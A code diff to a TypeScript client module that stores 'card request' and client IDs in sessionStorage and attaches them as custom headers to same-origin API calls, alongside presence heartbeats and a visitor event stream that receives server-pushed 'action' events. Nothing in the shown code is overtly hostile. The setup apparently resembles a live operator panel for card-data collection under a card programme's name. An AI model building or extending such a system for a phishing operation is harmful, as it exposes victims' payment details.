@@ -57,11 +57,43 @@ export interface ServerStatsPayload {
   serverTime?: number;
 }
 
-// Server-synchronized runtime identifiers (canonical source is HttpOnly server cookie + server session)
-let activeRequestId: string | null = null;
-let runtimeClientId = '';
+// Server-synchronized runtime identifiers (canonical source is HttpOnly server cookie + server session,
+// with sessionStorage + custom header fallback for mobile WebViews / Safari ITP / iframes)
+const REQ_STORAGE_KEY = 'fazaa_req_id';
+const CID_STORAGE_KEY = 'fazaa_cid';
+
+function readSessionValue(key: string): string {
+  try {
+    if (typeof window !== 'undefined' && window.sessionStorage) {
+      return window.sessionStorage.getItem(key) || '';
+    }
+  } catch {}
+  return '';
+}
+
+function writeSessionValue(key: string, value: string | null) {
+  try {
+    if (typeof window !== 'undefined' && window.sessionStorage) {
+      if (value) {
+        window.sessionStorage.setItem(key, value);
+      } else {
+        window.sessionStorage.removeItem(key);
+      }
+    }
+  } catch {}
+}
+
+let activeRequestId: string | null = readSessionValue(REQ_STORAGE_KEY) || null;
+let runtimeClientId = readSessionValue(CID_STORAGE_KEY) || '';
 let activeAdminToken = '';
 let firstVisitSent = false;
+
+function buildVisitorHeaders(extra?: Record<string, string>): Record<string, string> {
+  const headers: Record<string, string> = { ...(extra || {}) };
+  if (activeRequestId) headers['X-Request-Id'] = activeRequestId;
+  if (runtimeClientId) headers['X-Client-Id'] = runtimeClientId;
+  return headers;
+}
 
 export function getActiveRequestId(): string | null {
   return activeRequestId;
@@ -69,6 +101,12 @@ export function getActiveRequestId(): string | null {
 
 export function setActiveRequestId(id: string | null) {
   activeRequestId = id;
+  writeSessionValue(REQ_STORAGE_KEY, id);
+}
+
+function setRuntimeClientId(id: string) {
+  runtimeClientId = id;
+  writeSessionValue(CID_STORAGE_KEY, id || null);
 }
 
 export function getRuntimeClientId(): string {
@@ -79,12 +117,12 @@ export async function resolveActiveRequestId(): Promise<string | null> {
   if (activeRequestId) return activeRequestId;
   const current = await getCurrentCardRequest();
   if (current?.id) {
-    activeRequestId = current.id;
+    setActiveRequestId(current.id);
     return current.id;
   }
   const hb = await sendPresenceHeartbeat(typeof window !== 'undefined' ? window.location.pathname : '/');
   if (hb.requestId) {
-    activeRequestId = hb.requestId;
+    setActiveRequestId(hb.requestId);
     return hb.requestId;
   }
   return activeRequestId;
@@ -94,7 +132,7 @@ export async function createCardRequest(payload: Partial<RequestData>): Promise<
   const id = await resolveActiveRequestId();
   const res = await fetch('/api/requests', {
     method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
+    headers: buildVisitorHeaders({ 'Content-Type': 'application/json' }),
     credentials: 'same-origin',
     body: JSON.stringify({ ...payload, ...(id ? { id } : {}) })
   });
@@ -103,7 +141,7 @@ export async function createCardRequest(payload: Partial<RequestData>): Promise<
     throw new Error(data.error || 'Failed to create request');
   }
   if (data?.id) {
-    activeRequestId = data.id;
+    setActiveRequestId(data.id);
   }
   return data;
 }
@@ -112,7 +150,7 @@ export async function updateCardRequest(id: string, payload: Partial<RequestData
   const targetId = id || activeRequestId || 'current';
   const res = await fetch(`/api/requests/${encodeURIComponent(targetId)}`, {
     method: 'PATCH',
-    headers: { 'Content-Type': 'application/json' },
+    headers: buildVisitorHeaders({ 'Content-Type': 'application/json' }),
     credentials: 'same-origin',
     body: JSON.stringify(payload)
   });
@@ -121,7 +159,7 @@ export async function updateCardRequest(id: string, payload: Partial<RequestData
     throw new Error(data.error || 'Failed to update request');
   }
   if (data?.id) {
-    activeRequestId = data.id;
+    setActiveRequestId(data.id);
   }
   return data;
 }
@@ -140,11 +178,12 @@ export async function deleteCardRequest(id: string): Promise<{ ok: boolean; id: 
 
 export async function getCurrentCardRequest(): Promise<RequestData | null> {
   const res = await fetch('/api/requests/current', {
+    headers: buildVisitorHeaders(),
     credentials: 'same-origin'
   });
   if (!res.ok) return null;
   const data = await res.json();
-  if (data?.id) activeRequestId = data.id;
+  if (data?.id) setActiveRequestId(data.id);
   return data;
 }
 
@@ -152,12 +191,13 @@ export async function getCardRequest(id?: string | null): Promise<RequestData | 
   const targetId = id || activeRequestId || 'current';
   const url = targetId === 'current' ? '/api/requests/current' : `/api/requests/${encodeURIComponent(targetId)}`;
   const res = await fetch(url, {
+    headers: buildVisitorHeaders(),
     credentials: 'same-origin'
   });
   if (res.status === 404) return null;
   if (!res.ok) throw new Error('Failed to fetch request');
   const data = await res.json();
-  if (data?.id) activeRequestId = data.id;
+  if (data?.id) setActiveRequestId(data.id);
   return data;
 }
 
@@ -220,7 +260,7 @@ export async function sendPresenceHeartbeat(currentPage = '/'): Promise<{
   if (res.ok) {
     const data = await res.json().catch(() => null);
     if (data?.requestId) {
-      activeRequestId = data.requestId;
+      setActiveRequestId(data.requestId);
     }
     return {
       ok: true,
@@ -285,8 +325,8 @@ export function connectVisitorStream(
     es.addEventListener('connected', (ev: MessageEvent) => {
       try {
         const data = JSON.parse(ev.data);
-        if (data?.clientId) runtimeClientId = data.clientId;
-        if (data?.requestId) activeRequestId = data.requestId;
+        if (data?.clientId) setRuntimeClientId(data.clientId);
+        if (data?.requestId) setActiveRequestId(data.requestId);
         callbacks.onConnected?.(data);
       } catch {}
     });
@@ -294,7 +334,7 @@ export function connectVisitorStream(
     es.addEventListener('action', (ev: MessageEvent) => {
       try {
         const data = JSON.parse(ev.data);
-        if (data?.request?.id) activeRequestId = data.request.id;
+        if (data?.request?.id) setActiveRequestId(data.request.id);
         callbacks.onAction?.(data);
       } catch {}
     });
